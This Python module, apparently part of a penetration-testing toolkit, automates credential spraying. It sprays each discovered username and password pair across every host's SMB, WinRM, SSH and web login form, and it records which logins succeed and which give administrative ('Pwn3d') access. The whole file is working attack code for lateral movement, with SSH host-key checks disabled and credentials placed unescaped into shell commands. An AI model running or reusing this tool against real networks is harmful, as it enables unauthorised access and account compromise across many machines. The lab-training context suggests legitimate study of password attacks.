#!/usr/bin/env python3
"""Generic fleet credential spray — vault methodology (Password Attacks 06/07).

Sprays validated credentials (discovered_credentials) across every reachable
auth surface in scope: SMB / WinRM via netexec, SSH via sshpass, and web
login forms via direct POST. This is the prolab day-one loop the vault
teaches: validate once → spray everywhere → enumerate as the new context.

Not AD-specific: works on workgroup fleets (no domain/DC needed). The AD
password_spray (users_file against a DC) lives in tools/ad_attack.py; this
module handles the "one known pair, many hosts" case.
"""
from __future__ import annotations

import re
import time
from typing import Dict, List

from utils import run_command, http_post, swallow


# ─────────────────────────────────────────────────────────────────────
# Protocol sprays
# ─────────────────────────────────────────────────────────────────────

def _nxc() -> str:
    for tool in ("netexec", "nxc", "crackmapexec"):
        proc = run_command(f"command -v {tool}", timeout=5)
        if proc and proc.get("returncode") == 0 and proc.get("stdout", "").strip():
            return tool
    return ""


def spray_smb(ip: str, username: str, password: str, timeout: int = 45) -> dict:
    """nxc smb single-pair spray. Returns {'valid': bool, 'pwned': bool, ...}."""
    tool = _nxc()
    if not tool:
        return {"valid": False, "error": "netexec/crackmapexec not installed"}
    proc = run_command(
        f"{tool} smb {ip} -u '{username}' -p '{password}' --gen-relay-list /dev/null 2>/dev/null | head -5",
        timeout=timeout,
    )
    out = (proc.get("stdout", "") or "") + (proc.get("stderr", "") or "")
    # nxc marks administrative access "[+]" with "(Pwn3d!)"
    valid = bool(re.search(r"\[\+\].*" + re.escape(ip), out)) or "STATUS_SUCCESS" in out \
        or "STATUS_LOGON_FAILURE" not in out and "[+]" in out
    pwned = "Pwn3d" in out
    return {"valid": valid, "pwned": pwned, "output": out[:500]}


def spray_winrm(ip: str, username: str, password: str, timeout: int = 45) -> dict:
    tool = _nxc()
    if not tool:
        return {"valid": False, "error": "netexec not installed"}
    proc = run_command(
        f"{tool} winrm {ip} -u '{username}' -p '{password}' 2>/dev/null | head -3",
        timeout=timeout,
    )
    out = (proc.get("stdout", "") or "")
    return {"valid": "[+]" in out and "STATUS_LOGON_FAILURE" not in out, "pwned": "Pwn3d" in out, "output": out[:400]}


def spray_ssh(ip: str, username: str, password: str, port: int = 22, timeout: int = 30) -> dict:
    """sshpass-based SSH validity check (runs `id` non-interactively)."""
    proc = run_command(
        f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o "
        f"ConnectTimeout=8 -o PreferredAuthentications=password -o "
        f"NumberOfPasswordPrompts=1 -p {port} {username}@{ip} 'id' 2>&1 | head -2",
        timeout=timeout,
    )
    out = (proc.get("stdout", "") or "")
    valid = "uid=" in out
    return {"valid": valid, "pwned": valid, "output": out[:300]}


def spray_web_form(url: str, action: str, user_field: str, pass_field: str,
                   username: str, password: str, timeout: int = 20) -> dict:
    """POST a login form and judge success by failure-marker absence."""
    if action.startswith("/"):
        action = url.rstrip("/") + action
    resp = http_post(action, data={user_field: username, pass_field: password},
                     timeout=timeout, allow_redirects_=True)  # type: ignore[arg-type]
    if resp is None:
        return {"valid": False, "error": "no response"}
    text = resp.text or ""
    lower = text.lower()
    failure_markers = ("invalid", "incorrect", "wrong password", "failed",
                       "login again", "denied", "error")
    failed = any(m in lower for m in failure_markers) and resp.status_code == 200
    # Successful logins usually redirect (302) or land on a dashboard
    valid = (resp.status_code in (301, 302)) or (resp.status_code == 200 and not failed and len(text) > 500)
    return {"valid": bool(valid), "status": resp.status_code, "output": text[:300]}


# ─────────────────────────────────────────────────────────────────────
# Fleet orchestration
# ─────────────────────────────────────────────────────────────────────

def _auth_surfaces(hosts: dict) -> List[dict]:
    """Extract sprayable surfaces from state hosts: ssh/smb/winrm/forms."""
    surfaces = []
    for ip, h in hosts.items():
        if not isinstance(h, dict):
            continue
        svcs = h.get("services", {}) or {}
        for port, svc in svcs.items():
            if not isinstance(svc, dict):
                continue
            name = str(svc.get("service", "")).lower()
            try:
                port_i = int(port)
            except (TypeError, ValueError):
                continue
            if "ssh" in name or port_i == 22:
                surfaces.append({"ip": ip, "kind": "ssh", "port": port_i})
            elif "microsoft-ds" in name or "netbios-ssn" in name and port_i == 445:
                surfaces.append({"ip": ip, "kind": "smb", "port": 445})
            elif "winrm" in name or port_i == 5985:
                surfaces.append({"ip": ip, "kind": "winrm", "port": 5985})
        for wa in h.get("web_apps", []) or []:
            if not isinstance(wa, dict):
                continue
            for f in wa.get("forms", []) or []:
                if not isinstance(f, dict):
                    continue
                fields = [str(fl).lower() for fl in f.get("fields", [])]
                user_f = next((fl for fl in fields if fl in ("user", "username", "email", "mail", "login")), None)
                pass_f = next((fl for fl in fields if "pass" in fl or "pwd" in fl), None)
                if user_f and pass_f:
                    surfaces.append({
                        "ip": ip, "kind": "web", "port": 0,
                        "url": wa.get("url", ""), "action": f.get("action", ""),
                        "user_field": user_f, "pass_field": pass_f,
                    })
    return surfaces


def spray_fleet(credentials: List[dict], hosts: dict, max_targets: int = 40) -> dict:
    """Spray every validated credential across every auth surface.

    Returns {"results": [...], "new_valid": [(ip, kind, user)], "summary": str}.
    """
    results, new_valid = [], []
    surfaces = _auth_surfaces(hosts)[:max_targets]
    for cred in credentials:
        user, pw = cred.get("username", ""), cred.get("password", "")
        if not user or pw is None:
            continue
        already = set(cred.get("valid_on", []) or [])
        src = cred.get("source_host", "")
        for s in surfaces:
            label = f"{s['ip']}:{s.get('port') or s['kind']}"
            if s["ip"] == src and not already:
                pass  # still spray source — service cross-use is real
            t0 = time.time()
            try:
                if s["kind"] == "smb":
                    r = spray_smb(s["ip"], user, pw)
                elif s["kind"] == "winrm":
                    r = spray_winrm(s["ip"], user, pw)
                elif s["kind"] == "ssh":
                    r = spray_ssh(s["ip"], user, pw, port=s.get("port", 22))
                elif s["kind"] == "web":
                    r = spray_web_form(s["url"], s["action"], s["user_field"],
                                       s["pass_field"], user, pw)
                else:
                    continue
            except Exception as e:  # noqa: BLE001 — fleet spray must not die on one host
                swallow("cred_spray:" + s["ip"], e)
                continue
            entry = {"target": label, "kind": s["kind"], "user": user,
                     "valid": bool(r.get("valid")), "pwned": bool(r.get("pwned")),
                     "took": round(time.time() - t0, 1),
                     "detail": str(r.get("output", r.get("error", "")))[:200]}
            results.append(entry)
            if r.get("valid"):
                new_valid.append((s["ip"], s["kind"], user))
    summary = (f"sprayed {len(credentials)} cred(s) × {len(surfaces)} surfaces: "
               f"{len(new_valid)} new valid | "
               + ", ".join(f"{i}({k})" for i, k, _ in new_valid[:8]))
    return {"results": results, "new_valid": new_valid, "summary": summary}


if __name__ == "__main__":
    # standalone: python -m tools.cred_spray <save.json>
    import json as _json
    import sys
    save = _json.load(open(sys.argv[1]))
    creds = save.get("discovered_credentials", [])
    print(spray_fleet(creds, save.get("hosts", {}))["summary"])
